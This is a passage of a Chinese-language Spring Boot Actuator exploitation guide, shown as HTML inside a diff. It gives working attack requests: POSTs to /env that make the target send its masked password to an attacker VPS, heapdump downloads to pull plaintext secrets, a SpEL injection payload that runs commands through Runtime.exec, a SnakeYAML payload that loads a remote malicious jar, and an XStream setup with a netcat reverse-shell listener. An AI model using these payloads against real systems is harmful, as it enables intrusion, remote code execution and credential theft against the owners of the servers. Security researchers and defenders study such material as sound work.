+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;POST /env
+Content-Type: application/x-www-form-urlencoded
+
+spring.cloud.bootstrap.location=http://your-vps-ip/?=${security.user.password}
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;spring 2.x&lt;/p&gt;
+
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;POST /actuator/env
+Content-Type: application/json
+
+{&quot;name&quot;:&quot;spring.cloud.bootstrap.location&quot;,&quot;value&quot;:&quot;http://your-vps-ip/?=${security.user.password}&quot;}
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;eureka.client.serviceUrl.defaultZone&lt;/code&gt; 方法（&lt;strong&gt;不适用于&lt;/strong&gt;明文数据中有特殊 url 字符的情况）：&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;spring 1.x&lt;/p&gt;
+
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;POST /env
+Content-Type: application/x-www-form-urlencoded
+
+eureka.client.serviceUrl.defaultZone=http://your-vps-ip/${security.user.password}
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;spring 2.x&lt;/p&gt;
+
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;POST /actuator/env
+Content-Type: application/json
+
+{&quot;name&quot;:&quot;eureka.client.serviceUrl.defaultZone&quot;,&quot;value&quot;:&quot;http://your-vps-ip/${security.user.password}&quot;}
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;h5 id=&quot;步骤四-刷新配置-1&quot;&gt;步骤四： 刷新配置&lt;/h5&gt;
+
+&lt;p&gt;spring 1.x&lt;/p&gt;
+
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;POST /refresh
+Content-Type: application/x-www-form-urlencoded
+
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;spring 2.x&lt;/p&gt;
+
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;POST /actuator/refresh
+Content-Type: application/json
+
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;h3 id=&quot;0x06获取被星号脱敏的密码的明文-方法四&quot;&gt;0x06：获取被星号脱敏的密码的明文 (方法四)&lt;/h3&gt;
+
+&lt;blockquote&gt;
+  &lt;p&gt;访问 /env 接口时，spring actuator 会将一些带有敏感关键词(如 password、secret)的属性名对应的属性值用 * 号替换达到脱敏的效果&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;h4 id=&quot;利用条件-3&quot;&gt;利用条件：&lt;/h4&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;可正常 GET 请求目标 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/heapdump&lt;/code&gt; 或 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/actuator/heapdump&lt;/code&gt; 接口&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;h4 id=&quot;利用方法-3&quot;&gt;利用方法：&lt;/h4&gt;
+
+&lt;h5 id=&quot;步骤一-找到想要获取的属性名-3&quot;&gt;步骤一： 找到想要获取的属性名&lt;/h5&gt;
+
+&lt;p&gt;GET 请求目标网站的 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/env&lt;/code&gt; 或 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/actuator/env&lt;/code&gt; 接口，搜索 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;******&lt;/code&gt; 关键词，找到想要获取的被星号 * 遮掩的属性值对应的属性名。&lt;/p&gt;
+
+&lt;h5 id=&quot;步骤二-下载-jvm-heap-信息&quot;&gt;步骤二： 下载 jvm heap 信息&lt;/h5&gt;
+
+&lt;blockquote&gt;
+  &lt;p&gt;下载的 heapdump 文件大小通常在 50M—500M 之间，有时候也可能会大于 2G&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;p&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;GET&lt;/code&gt; 请求目标的 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/heapdump&lt;/code&gt; 或 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/actuator/heapdump&lt;/code&gt; 接口，下载应用实时的 JVM 堆信息&lt;/p&gt;
+
+&lt;h5 id=&quot;步骤三-使用-mat-获得-jvm-heap-中的密码明文&quot;&gt;步骤三： 使用 MAT 获得 jvm heap 中的密码明文&lt;/h5&gt;
+
+&lt;p&gt;参考 &lt;a href=&quot;https://landgrey.me/blog/16/&quot;&gt;文章&lt;/a&gt; 方法，使用 &lt;a href=&quot;https://www.eclipse.org/mat/downloads.php&quot;&gt;Eclipse Memory Analyzer&lt;/a&gt; 工具的 OQL 语句 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;select * from org.springframework.web.context.support.StandardServletEnvironment&lt;/code&gt;， 辅助快速过滤分析，获得密码明文&lt;/p&gt;
+
+&lt;h2 id=&quot;二远程代码执行&quot;&gt;二：远程代码执行&lt;/h2&gt;
+
+&lt;blockquote&gt;
+  &lt;p&gt;由于 spring boot 相关漏洞可能是多个组件漏洞组合导致的，所以有些漏洞名字起的不太正规，以能区分为准&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;h3 id=&quot;0x01whitelabel-error-page-spel-rce&quot;&gt;0x01：whitelabel error page SpEL RCE&lt;/h3&gt;
+
+&lt;h4 id=&quot;利用条件-4&quot;&gt;利用条件：&lt;/h4&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;spring boot 1.1.0-1.1.12、1.2.0-1.2.7、1.3.0&lt;/li&gt;
+  &lt;li&gt;至少知道一个触发 springboot 默认错误页面的接口及参数名&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;h4 id=&quot;利用方法-4&quot;&gt;利用方法：&lt;/h4&gt;
+
+&lt;h5 id=&quot;步骤一找到一个正常传参处&quot;&gt;步骤一：找到一个正常传参处&lt;/h5&gt;
+
+&lt;p&gt;比如发现访问  &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/article?id=xxx&lt;/code&gt; ，页面会报状态码为 500 的错误： &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Whitelabel Error Page&lt;/code&gt;，则后续 payload 都将会在参数 id 处尝试。&lt;/p&gt;
+
+&lt;h5 id=&quot;步骤二执行-spel-表达式&quot;&gt;步骤二：执行 SpEL 表达式&lt;/h5&gt;
+
+&lt;p&gt;输入 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/article?id=${7*7}&lt;/code&gt; ，如果发现报错页面将 7*7 的值 49 计算出来显示在报错页面上，那么基本可以确定目标存在 SpEL 表达式注入漏洞。&lt;/p&gt;
+
+&lt;p&gt;由字符串格式转换成 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;0x**&lt;/code&gt; java 字节形式，方便执行任意代码：&lt;/p&gt;
+
+&lt;div class=&quot;language-python highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c1&quot;&gt;# coding: utf-8
+&lt;/span&gt;
+&lt;span class=&quot;n&quot;&gt;result&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;&quot;&lt;/span&gt;
+&lt;span class=&quot;n&quot;&gt;target&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&#39;open -a Calculator&#39;&lt;/span&gt;
+&lt;span class=&quot;k&quot;&gt;for&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;x&lt;/span&gt; &lt;span class=&quot;ow&quot;&gt;in&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;target&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
+    &lt;span class=&quot;n&quot;&gt;result&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+=&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;hex&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;ord&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;x&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;,&quot;&lt;/span&gt;
+&lt;span class=&quot;k&quot;&gt;print&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;result&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;rstrip&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&#39;,&#39;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;执行 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;open -a Calculator&lt;/code&gt; 命令&lt;/p&gt;
+
+&lt;div class=&quot;language-java highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;err&quot;&gt;$&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;no&quot;&gt;T&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;java&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;lang&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;Runtime&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;).&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;getRuntime&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;().&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;exec&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;new&lt;/span&gt; &lt;span class=&quot;nc&quot;&gt;String&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;new&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;byte&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;[]{&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x6f&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x70&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x65&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x6e&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x20&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x2d&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x61&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x20&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x43&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x61&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x6c&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x63&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x75&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x6c&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x61&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x74&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x6f&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x72&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;}))}&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;h4 id=&quot;漏洞原理&quot;&gt;漏洞原理：&lt;/h4&gt;
+
+&lt;ol&gt;
+  &lt;li&gt;spring boot 处理参数值出错，流程进入 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;org.springframework.util.PropertyPlaceholderHelper&lt;/code&gt; 类中&lt;/li&gt;
+  &lt;li&gt;此时 URL 中的参数值会用 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;parseStringValue&lt;/code&gt; 方法进行递归解析&lt;/li&gt;
+  &lt;li&gt;其中  &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;${}&lt;/code&gt;  包围的内容都会被 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;org.springframework.boot.autoconfigure.web.ErrorMvcAutoConfiguration&lt;/code&gt; 类的 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;resolvePlaceholder&lt;/code&gt; 方法当作 SpEL 表达式被解析执行，造成 RCE 漏洞&lt;/li&gt;
+&lt;/ol&gt;
+
+&lt;h4 id=&quot;漏洞分析&quot;&gt;漏洞分析：&lt;/h4&gt;
+
+&lt;p&gt;​	&lt;a href=&quot;https://www.cnblogs.com/litlife/p/10183137.html&quot;&gt;SpringBoot SpEL表达式注入漏洞-分析与复现&lt;/a&gt;&lt;/p&gt;
+
+&lt;h4 id=&quot;漏洞环境&quot;&gt;漏洞环境：&lt;/h4&gt;
+
+&lt;p&gt;&lt;a href=&quot;https://github.com/LandGrey/SpringBootVulExploit/tree/master/repository/springboot-spel-rce&quot;&gt;repository/springboot-spel-rce&lt;/a&gt;&lt;/p&gt;
+
+&lt;p&gt;正常访问：&lt;/p&gt;
+
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;http://127.0.0.1:9091/article?id=66
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;执行 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;open -a Calculator&lt;/code&gt; 命令：&lt;/p&gt;
+
+&lt;div class=&quot;language-java highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nl&quot;&gt;http:&lt;/span&gt;&lt;span class=&quot;c1&quot;&gt;//127.0.0.1:9091/article?id=${T(java.lang.Runtime).getRuntime().exec(new%20String(new%20byte[]{0x6f,0x70,0x65,0x6e,0x20,0x2d,0x61,0x20,0x43,0x61,0x6c,0x63,0x75,0x6c,0x61,0x74,0x6f,0x72}))}&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;h3 id=&quot;0x02spring-cloud-snakeyaml-rce&quot;&gt;0x02：spring cloud SnakeYAML RCE&lt;/h3&gt;
+
+&lt;h4 id=&quot;利用条件-5&quot;&gt;利用条件：&lt;/h4&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;可以 POST 请求目标网站的 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/env&lt;/code&gt; 接口设置属性&lt;/li&gt;
+  &lt;li&gt;可以 POST 请求目标网站的 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/refresh&lt;/code&gt; 接口刷新配置（存在 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;spring-boot-starter-actuator&lt;/code&gt; 依赖）&lt;/li&gt;
+  &lt;li&gt;目标依赖的 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;spring-cloud-starter&lt;/code&gt; 版本 &amp;lt; 1.3.0.RELEASE&lt;/li&gt;
+  &lt;li&gt;目标可以请求攻击者的 HTTP 服务器（请求可出外网）&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;h4 id=&quot;利用方法-5&quot;&gt;利用方法：&lt;/h4&gt;
+
+&lt;h5 id=&quot;步骤一-托管-yml-和-jar-文件&quot;&gt;步骤一： 托管 yml 和 jar 文件&lt;/h5&gt;
+
+&lt;p&gt;在自己控制的 vps 机器上开启一个简单 HTTP 服务器，端口尽量使用常见 HTTP 服务端口（80、443）&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c&quot;&gt;# 使用 python 快速开启 http server&lt;/span&gt;
+
+python2 &lt;span class=&quot;nt&quot;&gt;-m&lt;/span&gt; SimpleHTTPServer 80
+python3 &lt;span class=&quot;nt&quot;&gt;-m&lt;/span&gt; http.server 80
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;在网站根目录下放置后缀为 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;yml&lt;/code&gt; 的文件  &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;example.yml&lt;/code&gt;，内容如下：&lt;/p&gt;
+
+&lt;div class=&quot;language-yaml highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;kt&quot;&gt;!!javax.script.ScriptEngineManager&lt;/span&gt; &lt;span class=&quot;pi&quot;&gt;[&lt;/span&gt;
+  &lt;span class=&quot;kt&quot;&gt;!!java.net.URLClassLoader&lt;/span&gt; &lt;span class=&quot;pi&quot;&gt;[[&lt;/span&gt;
+    &lt;span class=&quot;kt&quot;&gt;!!java.net.URL&lt;/span&gt; &lt;span class=&quot;pi&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;http://your-vps-ip/example.jar&quot;&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;]&lt;/span&gt;
+  &lt;span class=&quot;pi&quot;&gt;]]&lt;/span&gt;
+&lt;span class=&quot;pi&quot;&gt;]&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;在网站根目录下放置后缀为 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;jar&lt;/code&gt; 的文件  &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;example.jar&lt;/code&gt;，内容是要执行的代码，代码编写及编译方式参考 &lt;a href=&quot;https://github.com/artsploit/yaml-payload&quot;&gt;yaml-payload&lt;/a&gt;。&lt;/p&gt;
+
+&lt;h5 id=&quot;步骤二-设置-springcloudbootstraplocation-属性&quot;&gt;步骤二： 设置 spring.cloud.bootstrap.location 属性&lt;/h5&gt;
+
+&lt;p&gt;spring 1.x&lt;/p&gt;
+
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;POST /env
+Content-Type: application/x-www-form-urlencoded
+
+spring.cloud.bootstrap.location=http://your-vps-ip/example.yml
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;spring 2.x&lt;/p&gt;
+
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;POST /actuator/env
+Content-Type: application/json
+
+{&quot;name&quot;:&quot;spring.cloud.bootstrap.location&quot;,&quot;value&quot;:&quot;http://your-vps-ip/example.yml&quot;}
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;h5 id=&quot;步骤三-刷新配置&quot;&gt;步骤三： 刷新配置&lt;/h5&gt;
+
+&lt;p&gt;spring 1.x&lt;/p&gt;
+
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;POST /refresh
+Content-Type: application/x-www-form-urlencoded
+
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;spring 2.x&lt;/p&gt;
+
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;POST /actuator/refresh
+Content-Type: application/json
+
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;h4 id=&quot;漏洞原理-1&quot;&gt;漏洞原理：&lt;/h4&gt;
+
+&lt;ol&gt;
+  &lt;li&gt;spring.cloud.bootstrap.location 属性被设置为外部恶意 yml 文件 URL 地址&lt;/li&gt;
+  &lt;li&gt;refresh 触发目标机器请求远程 HTTP 服务器上的 yml 文件，获得其内容&lt;/li&gt;
+  &lt;li&gt;SnakeYAML 由于存在反序列化漏洞，所以解析恶意 yml 内容时会完成指定的动作&lt;/li&gt;
+  &lt;li&gt;先是触发 java.net.URL 去拉取远程 HTTP 服务器上的恶意 jar 文件&lt;/li&gt;
+  &lt;li&gt;然后是寻找 jar 文件中实现 javax.script.ScriptEngineFactory 接口的类并实例化&lt;/li&gt;
+  &lt;li&gt;实例化类时执行恶意代码，造成 RCE 漏洞&lt;/li&gt;
+&lt;/ol&gt;
+
+&lt;h4 id=&quot;漏洞分析-1&quot;&gt;漏洞分析：&lt;/h4&gt;
+
+&lt;p&gt;​	&lt;a href=&quot;https://b1ngz.github.io/exploit-spring-boot-actuator-spring-cloud-env-note/&quot;&gt;Exploit Spring Boot Actuator 之 Spring Cloud Env 学习笔记&lt;/a&gt;&lt;/p&gt;
+
+&lt;h4 id=&quot;漏洞环境-1&quot;&gt;漏洞环境：&lt;/h4&gt;
+
+&lt;p&gt;&lt;a href=&quot;https://github.com/LandGrey/SpringBootVulExploit/tree/master/repository/springcloud-snakeyaml-rce&quot;&gt;repository/springcloud-snakeyaml-rce&lt;/a&gt;&lt;/p&gt;
+
+&lt;p&gt;正常访问：&lt;/p&gt;
+
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;http://127.0.0.1:9092/env
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;h3 id=&quot;0x03eureka-xstream-deserialization-rce&quot;&gt;0x03：eureka xstream deserialization RCE&lt;/h3&gt;
+
+&lt;h4 id=&quot;利用条件-6&quot;&gt;利用条件：&lt;/h4&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;可以 POST 请求目标网站的 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/env&lt;/code&gt; 接口设置属性&lt;/li&gt;
+  &lt;li&gt;可以 POST 请求目标网站的 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/refresh&lt;/code&gt; 接口刷新配置（存在 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;spring-boot-starter-actuator&lt;/code&gt; 依赖）&lt;/li&gt;
+  &lt;li&gt;目标使用的  &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;eureka-client&lt;/code&gt; &amp;lt; 1.8.7（通常包含在 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;spring-cloud-starter-netflix-eureka-client&lt;/code&gt; 依赖中）&lt;/li&gt;
+  &lt;li&gt;目标可以请求攻击者的 HTTP 服务器（请求可出外网）&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;h4 id=&quot;利用方法-6&quot;&gt;利用方法：&lt;/h4&gt;
+
+&lt;h5 id=&quot;步骤一架设响应恶意-xstream-payload-的网站&quot;&gt;步骤一：架设响应恶意 XStream payload 的网站&lt;/h5&gt;
+
+&lt;p&gt;提供一个依赖 Flask 并符合要求的 &lt;a href=&quot;https://raw.githubusercontent.com/LandGrey/SpringBootVulExploit/master/codebase/springboot-xstream-rce.py&quot;&gt;python 脚本示例&lt;/a&gt;，作用是利用目标 Linux 机器上自带的 python 来反弹shell。&lt;/p&gt;
+
+&lt;p&gt;使用 python 在自己控制的服务器上运行以上的脚本，并根据实际情况修改脚本中反弹 shell 的 ip 地址和 端口号。&lt;/p&gt;
+
+&lt;h5 id=&quot;步骤二监听反弹-shell-的端口&quot;&gt;步骤二：监听反弹 shell 的端口&lt;/h5&gt;
+
+&lt;p&gt;一般使用 nc 监听端口，等待反弹 shell&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;nc &lt;span class=&quot;nt&quot;&gt;-lvp&lt;/span&gt; 443
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;h5 id=&quot;步骤三设置-eurekaclientserviceurldefaultzone-属性&quot;&gt;步骤三：设置 eureka.client.serviceUrl.defaultZone 属性&lt;/h5&gt;
+
+&lt;p&gt;spring 1.x&lt;/p&gt;
+
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;POST /env
+Content-Type: application/x-www-form-urlencoded
+
+eureka.client.serviceUrl.defaultZone=http://your-vps-ip/example
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;spring 2.x&lt;/p&gt;
+
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;POST /actuator/env
+Content-Type: application/json
+
+{&quot;name&quot;:&quot;eureka.client.serviceUrl.defaultZone&quot;,&quot;value&quot;:&quot;http://your-vps-ip/example&quot;}
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;h5 id=&quot;步骤四刷新配置&quot;&gt;步骤四：刷新配置&lt;/h5&gt;
+
+&lt;p&gt;spring 1.x&lt;/p&gt;
+
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;POST /refresh
+Content-Type: application/x-www-form-urlencoded
+
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;spring 2.x&lt;/p&gt;
+
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;POST /actuator/refresh
+Content-Type: application/json
+
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;h4 id=&quot;漏洞原理-2&quot;&gt;漏洞原理：&lt;/h4&gt;
+
+&lt;ol&gt;
+  &lt;li&gt;eureka.client.serviceUrl.defaultZone 属性被设置为恶意的外部 eureka server URL 地址&lt;/li&gt;
+  &lt;li&gt;refresh 触发目标机器请求远程 URL，提前架设的 fake eureka server 就会返回恶意的 payload&lt;/li&gt;
+  &lt;li&gt;目标机器相关依赖解析 payload，触发 XStream 反序列化，造成 RCE 漏洞&lt;/li&gt;
+&lt;/ol&gt;
+
+&lt;h4 id=&quot;漏洞分析-2&quot;&gt;漏洞分析：&lt;/h4&gt;
+
